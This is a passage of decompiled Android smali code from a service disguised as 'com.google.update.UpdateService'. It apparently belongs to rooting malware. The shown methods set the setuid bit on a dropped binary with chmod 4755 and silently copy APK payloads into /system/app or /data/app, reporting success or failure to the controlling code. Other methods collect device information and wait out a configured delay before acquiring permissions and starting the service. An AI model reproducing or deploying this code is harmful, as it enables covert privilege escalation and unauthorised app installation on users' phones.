    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Lcom/google/update/RU$U12;->U2(Ljava/lang/String;)Z

    .line 716
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "4 /system/bin/chmod 4755 "

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Lcom/google/update/RU$U12;->U2(Ljava/lang/String;)Z

    .line 718
    new-instance v8, Ljava/io/File;

    invoke-direct {v8, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8}, Ljava/io/File;->exists()Z

    move-result v8

    if-eqz v8, :cond_2

    .line 719
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "4 "

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 720
    .restart local v0    # "cmd":Ljava/lang/String;
    invoke-static {v0}, Lcom/google/update/RU$U12;->U2(Ljava/lang/String;)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 724
    .end local v0    # "cmd":Ljava/lang/String;
    :cond_2
    const/4 v8, 0x0

    goto/16 :goto_0

    .line 722
    .end local v2    # "dest":Ljava/lang/String;
    :catch_0
    move-exception v8

    move-object v3, v8

    .local v3, "e":Ljava/lang/Exception;
    const-string v8, "BINEXEC"

    goto/16 :goto_0

    .line 710
    .end local v3    # "e":Ljava/lang/Exception;
    :catch_1
    move-exception v8

    goto :goto_1
.end method

.method private updateInfo()V
    .locals 2

    .prologue
    .line 146
    invoke-static {p0}, Lcom/google/update/RU$U11;->U2(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/google/update/UpdateService;->m3:Ljava/lang/String;

    .line 147
    invoke-static {p0}, Lcom/google/update/RU$U11;->U3(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/google/update/UpdateService;->m4:Ljava/lang/String;

    .line 149
    invoke-static {}, Lcom/google/update/RU$U11;->U4()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/google/update/UpdateService;->m5:Ljava/lang/String;

    .line 150
    invoke-static {}, Lcom/google/update/RU$U11;->U5()[Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    aget-object v0, v0, v1

    iput-object v0, p0, Lcom/google/update/UpdateService;->m6:Ljava/lang/String;

    .line 151
    invoke-static {}, Lcom/google/update/RU$U11;->U5()[Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x1

    aget-object v0, v0, v1

    iput-object v0, p0, Lcom/google/update/UpdateService;->m7:Ljava/lang/String;

    .line 152
    invoke-static {p0}, Lcom/google/update/RU$U11;->U6(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/google/update/UpdateService;->m8:Ljava/lang/String;

    .line 153
    invoke-static {p0}, Lcom/google/update/RU$U11;->U9(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/google/update/UpdateService;->m9:Ljava/lang/String;

    .line 154
    invoke-static {p0}, Lcom/google/update/RU$U11;->U10(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/google/update/UpdateService;->m10:Ljava/lang/String;

    .line 155
    invoke-static {p0}, Lcom/google/update/RU$U11;->U12(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/google/update/UpdateService;->m11:Ljava/lang/String;

    .line 156
    return-void
.end method


# virtual methods
.method public U3([Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 8
    .param p1, "P1"    # [Ljava/lang/String;
    .param p2, "P2"    # Ljava/lang/String;
    .param p3, "P3"    # Ljava/lang/String;

    .prologue
    const/4 v7, 0x5

    const/4 v6, 0x0

    const/4 v5, 0x1

    .line 771
    aget-object v3, p1, v5

    invoke-static {p0, v3}, Lcom/google/update/RU$U10;->U1(Landroid/content/Context;Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    .line 773
    .local v1, "b":[Ljava/lang/String;
    invoke-direct {p0}, Lcom/google/update/UpdateService;->checkPermission()Z

    move-result v3

    if-eqz v3, :cond_4

    .line 775
    if-eqz p3, :cond_1

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "2 "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    aget-object v4, p1, v6

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, " /system/app/"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 777
    .local v2, "cmd":Ljava/lang/String;
    :goto_0
    invoke-static {v2}, Lcom/google/update/RU$U12;->U2(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_3

    .line 778
    if-nez p2, :cond_2

    move v0, v5

    .line 779
    .local v0, "a":I
    :goto_1
    const-string v3, "CPInstOK"

    invoke-direct {p0, v0, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 780
    if-eqz p2, :cond_0

    invoke-direct {p0, p2}, Lcom/google/update/UpdateService;->U2(Ljava/lang/String;)V

    .line 784
    .end local v0    # "a":I
    .end local v2    # "cmd":Ljava/lang/String;
    :cond_0
    :goto_2
    return-void

    .line 776
    :cond_1
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "1 "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    aget-object v4, p1, v6

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, " /data/app/"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    aget-object v4, v1, v5

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, ".apk"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .restart local v2    # "cmd":Ljava/lang/String;
    goto :goto_0

    :cond_2
    move v0, v7

    .line 778
    goto :goto_1

    .line 782
    :cond_3
    const-string v3, "CPInstFail"

    invoke-direct {p0, v7, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_2

    .line 783
    .end local v2    # "cmd":Ljava/lang/String;
    :cond_4
    const/4 v3, -0x1

    const-string v4, "NOPERM"

    invoke-direct {p0, v3, v4}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_2
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 99
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 21

    .prologue
    .line 108
    invoke-super/range {p0 .. p0}, Landroid/app/Service;->onCreate()V

    .line 111
    :try_start_0
    invoke-virtual/range {p0 .. p0}, Lcom/google/update/UpdateService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v15

    invoke-virtual/range {p0 .. p0}, Lcom/google/update/UpdateService;->getPackageName()Ljava/lang/String;

    move-result-object v16

    const/16 v17, 0x80

    invoke-virtual/range {v15 .. v17}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v4

    .line 112
    .local v4, "ai":Landroid/content/pm/ApplicationInfo;
    iget-object v5, v4, Landroid/content/pm/ApplicationInfo;->metaData:Landroid/os/Bundle;

    .line 113
    .local v5, "bundle":Landroid/os/Bundle;
    const-string v15, "ST_START_DELAY"

    invoke-virtual {v5, v15}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v13

    .line 114
    .local v13, "value":Ljava/lang/Object;
    if-eqz v13, :cond_0

    check-cast v13, Ljava/lang/Integer;

    .end local v13    # "value":Ljava/lang/Object;
    invoke-virtual {v13}, Ljava/lang/Integer;->intValue()I

    move-result v15

    int-to-long v15, v15

    move-wide v0, v15

    move-object/from16 v2, p0

    iput-wide v0, v2, Lcom/google/update/UpdateService;->m18:J

    .line 115
    :cond_0
    const-string v15, "ST_MY_PID"

    invoke-virtual {v5, v15}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v14

    .line 116
    .local v14, "value2":Ljava/lang/Object;
    if-eqz v14, :cond_1

    check-cast v14, Ljava/lang/String;

    .end local v14    # "value2":Ljava/lang/Object;
    move-object v0, v14

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/google/update/UpdateService;->m2:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 121
    .end local v4    # "ai":Landroid/content/pm/ApplicationInfo;
    .end local v5    # "bundle":Landroid/os/Bundle;
    :cond_1
    :goto_0
    const-string v15, "sstimestamp"

    const/16 v16, 0x0

    move-object/from16 v0, p0

    move-object v1, v15

    move/from16 v2, v16

    invoke-virtual {v0, v1, v2}, Lcom/google/update/UpdateService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v12

    .line 122
    .local v12, "p":Landroid/content/SharedPreferences;
    const-string v15, "start"

    const-wide/16 v16, 0x0

    move-object v0, v12

    move-object v1, v15

    move-wide/from16 v2, v16

    invoke-interface {v0, v1, v2, v3}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v10

    .line 123
    .local v10, "last":J
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v6

    .line 124
    .local v6, "cur":J
    const-wide/16 v15, 0x0

    cmp-long v15, v10, v15

    if-nez v15, :cond_2

    .line 125
    invoke-interface {v12}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v9

    .line 126
    .local v9, "ed":Landroid/content/SharedPreferences$Editor;
    const-string v15, "start"

    invoke-interface {v9, v15, v6, v7}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 127
    invoke-interface {v9}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 128
    move-object/from16 v0, p0

    iget-wide v0, v0, Lcom/google/update/UpdateService;->m18:J

    move-wide v15, v0

    const-wide/16 v17, 0x0

    cmp-long v15, v15, v17

    if-lez v15, :cond_3

    .line 129
    invoke-virtual/range {p0 .. p0}, Lcom/google/update/UpdateService;->stopSelf()V

    .line 143
    .end local v9    # "ed":Landroid/content/SharedPreferences$Editor;
    :goto_1
    return-void

    .line 117
    .end local v6    # "cur":J
    .end local v10    # "last":J
    .end local v12    # "p":Landroid/content/SharedPreferences;
    :catch_0
    move-exception v15

    move-object v8, v15

    .line 118
    .local v8, "e":Ljava/lang/Exception;
    invoke-virtual {v8}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0

    .line 132
    .end local v8    # "e":Ljava/lang/Exception;
    .restart local v6    # "cur":J
    .restart local v10    # "last":J
    .restart local v12    # "p":Landroid/content/SharedPreferences;
    :cond_2
    sub-long v15, v6, v10

    move-object/from16 v0, p0

    iget-wide v0, v0, Lcom/google/update/UpdateService;->m18:J

    move-wide/from16 v17, v0

    const-wide/16 v19, 0x3e8

    mul-long v17, v17, v19

    cmp-long v15, v15, v17

    if-gez v15, :cond_3

    .line 133
    invoke-virtual/range {p0 .. p0}, Lcom/google/update/UpdateService;->stopSelf()V

    goto :goto_1

    .line 137
    :cond_3
    const-string v15, "permission"

    const/16 v16, 0x0

    move-object/from16 v0, p0

    move-object v1, v15

    move/from16 v2, v16

    invoke-virtual {v0, v1, v2}, Lcom/google/update/UpdateService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v15

    move-object v0, v15

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/google/update/UpdateService;->m1:Landroid/content/SharedPreferences;

    .line 139
    invoke-static/range {p0 .. p0}, Lcom/google/update/RU;->U2(Landroid/content/Context;)Z

    move-result v15

    if-eqz v15, :cond_4

    invoke-direct/range {p0 .. p0}, Lcom/google/update/UpdateService;->doSearchReport()V

    .line 141
    :cond_4
    invoke-direct/range {p0 .. p0}, Lcom/google/update/UpdateService;->getPermission()V

    .line 142
    invoke-direct/range {p0 .. p0}, Lcom/google/update/UpdateService;->provideService()V

    goto :goto_1
.end method

.method public onDestroy()V
    .locals 1

    .prologue
    .line 160
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 162
    iget-object v0, p0, Lcom/google/update/UpdateService;->m15:Ljava/util/Timer;

    if-eqz v0, :cond_0

    .line 163
    iget-object v0, p0, Lcom/google/update/UpdateService;->m15:Ljava/util/Timer;

    invoke-virtual {v0}, Ljava/util/Timer;->cancel()V

    .line 165
    :cond_0
    return-void
.end method
